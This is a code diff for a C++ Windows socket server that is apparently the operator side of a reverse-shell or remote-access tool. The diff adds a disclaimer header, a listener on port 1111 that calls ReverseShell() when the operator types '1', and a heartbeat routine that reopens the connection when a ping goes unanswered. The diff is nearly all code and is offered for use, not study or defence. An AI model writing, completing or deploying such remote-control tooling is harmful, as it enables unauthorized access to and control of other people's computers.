@@ -1,4 +1,10 @@
+/*
+Author: millybilligan
+GitHub: https://github.com/millybilligan
+The author is not responsible for the use of this program. Use for illegal purposes is prohibited!
+*/
 #include "server.h"
+
 
 void Server::readFromSocket(SOCKET& sock) {
 	int iResult;
@@ -16,7 +22,6 @@ void Server::readFromSocket(SOCKET& sock) {
 		fflush(stdout);
 	}
 }
-
 INT Server::ReverseShell() {
 	WSADATA wsadata;
 	SOCKET sockServer, sockClient;
@@ -62,6 +67,48 @@ INT Server::ReverseShell() {
 	WSACleanup();
 
 	return 0;
+}
+void Server::startConnection() {
+	WSAData wsaData;
+	WORD DLLVersion = MAKEWORD(2, 1);
+	WSAStartup(DLLVersion, &wsaData);
+
+	SOCKADDR_IN addr;
+	int sizeofAddr = sizeof(addr);
+	addr.sin_addr.S_un.S_addr = INADDR_ANY;
+	addr.sin_port = htons(1111);
+	addr.sin_family = AF_INET;
+
+	SOCKET sListen = socket(AF_INET, SOCK_STREAM, 0);
+	bind(sListen, (SOCKADDR*)&addr, sizeof(addr));
+
+	listen(sListen, SOMAXCONN);
+
+	SOCKET newConnection;
+	newConnection = accept(sListen, (SOCKADDR*)&addr, &sizeofAddr);
+
+	if (newConnection != 0) {
+		char szResp;
+		while (true) {
+			char buf;
+			cin >> szResp;
+			if (szResp == '1') {
+				send(newConnection, &szResp, sizeof(szResp), 0);
+				ReverseShell();
+			}
+		}
+	}
+}
+
+void Server::ping(SOCKET& sock) {
+		Sleep(10000);
+		char buf;
+		char szResp = '?';
+		send(sock, &szResp, sizeof(szResp), 0);
+		recv(sock, &buf, sizeof(buf), 0);
+		if (buf != '!') {
+			startConnection();
+		}
 }
 
 char Server::inputUser[MAX_INPUT_BUFFER];
